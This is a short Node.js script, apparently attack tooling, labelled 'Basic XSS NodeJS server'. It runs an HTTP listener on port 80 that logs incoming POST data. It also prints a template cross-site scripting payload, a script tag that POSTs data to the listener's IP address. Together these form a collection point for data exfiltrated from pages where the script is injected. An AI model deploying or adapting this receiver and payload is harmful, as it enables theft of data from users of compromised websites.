console.log(""+
" *====================================*\n"+
" |    Author: Kya                     |\n"+
" |    Version: 1.0                    |\n"+
" |    Name: Basic XSS NodeJS server   |\n"+
" *====================================*");

var http = require('http');
var ip = require('ip');
var server = http.createServer(function (request, response) {
    if (request.method == 'POST') {
        var body = '';
        request.on('data', function (data) {
            body += data;
        });
        request.on('end', function () {

            var POST = JSON.parse(body);
            console.log(POST);

        });
    }
});
server.listen(80);

console.log("\x1b[5m\x1b[32m%s\x1b[0m","\n=== Server ready! === ");
console.log("\x1b[4m%s\x1b[0m","\nTemplate XSS:");
console.log("\x1b[35m%s\x1b[0m","<script>var xhr= new XMLHttpRequest();message=JSON.stringify('message');xhr.open('POST','http://"+ip.address()+"',true);xhr.send(message);</script>\n\nNow waiting for data...");

console.log("\x1b[4m%s\x1b[0m","Data received:\n");
